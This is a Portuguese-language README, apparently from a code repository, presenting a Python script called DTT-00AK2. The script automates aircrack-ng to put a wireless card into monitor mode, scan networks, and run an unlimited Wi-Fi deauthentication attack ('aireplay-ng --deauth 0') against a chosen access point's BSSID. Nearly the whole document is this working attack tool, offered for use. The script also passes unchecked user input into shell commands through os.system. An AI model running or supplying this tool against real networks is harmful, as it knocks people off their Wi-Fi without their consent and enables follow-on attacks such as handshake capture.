# DTT-00AK2

Automatizei com python alguns processos do aircrack-ng. DTT-00AK2 tem como foco realizar ataques de desautenticação em um ponto de acesso sem fio. Explorando uma vulnerabilidade na camada de autenticação e/ou gerenciamento de conexões do protocolo Wi-Fi (padrões IEEE 802.11). Qualquer dispositivo ou roteador que utilize o protocolo está sujeito ao ataque.

```python

             _..---..__
           ,'          `-.
          .'` .          )             DTT-00AK2
          |     `;.__.._.'               V.1.1
           \ .`--.(##)(#).    Wi-Fi deauthentication attack 
            `-->;--' pWq`>              BY:AND3R
              < <"v\,,,,]
               `\`^-''''7
                 `~"--^-'

````

```python

import os

class WifiAttackTool:
    RED = '\033[91m'
    YELLOW = '\033[93m'
    GREEN = '\033[92m'
    RESET = '\033[0m'

    def __init__(self):
        pass

    def start_monitor_mode(self):
        os.system("airmon-ng")
        interface = input("Digite aqui qual interface utilizar: ")
        os.system(f"airmon-ng start {interface}")

    def analyze_wifi_traffic(self):
        interface = input(self.GREEN + "Digite a interface: " + self.RESET)
        os.system(f'xterm -e airodump-ng "{interface}"')
        os.system('clear')

    def filter_results_by_bssid(self):
        channel = input(self.GREEN + "Digite o canal: " + self.RESET)
        bssid = input(self.GREEN + "Digite a BSSID: " + self.RESET)
        interface = input(self.GREEN + "Digite a interface: " + self.RESET)
        os.system('clear')
        os.system(f'xterm -e airodump-ng -c {channel} --bssid {bssid} {interface}')
        os.system('clear')

    def perform_deauthentication_attack(self):
        bssid = input(self.GREEN + "Digite a BSSID: " + self.RESET)
        interface = input(self.GREEN + "Digite a interface: " + self.RESET)
        os.system(f'xterm -e aireplay-ng --deauth 0 -a {bssid} {interface}')

    def run(self):
        while True:
            print(self.RED + """
                     _..---..__
                   ,'          `-.
                  .'` .          )             DTT-00AK2
                  |     `;.__.._.'               V.1.1
                   \ .`--.(##)(#).    Wi-Fi deauthentication attack 
                    `-->;--' pWq`>              BY:AND3R
                      < <"v\,,,,]
                       `\`^-''''7
                         `~"--^-'
            """ + self.RESET)
            print(self.RED + "1- [airmon-ng] Colocar a interface em modo monitor" + self.RESET)
            print(self.YELLOW + "2- [airodump-ng] Analisar o tráfego de redes sem fio" + self.RESET)
            print(self.RED + "3- [airodump-ng] Filtrar os resultados pelo BSSID" + self.RESET)
            print(self.YELLOW + "4- [aireplay-ng] Realizar ataque no ponto de acesso (AP)" + self.RESET)
            print(self.RED + "5- Sair" + self.RESET)

            menu = input(self.RED + "Digite uma opção >> " + self.RESET)

            if menu == "1":
                self.start_monitor_mode()
            elif menu == "2":
                self.analyze_wifi_traffic()
            elif menu == "3":
                self.filter_results_by_bssid()
            elif menu == "4":
                self.perform_deauthentication_attack()
            elif menu == "5":
                break
            else:
                print("Opção inválida")

if __name__ == "__main__":
    tool = WifiAttackTool()
    tool.run()

```

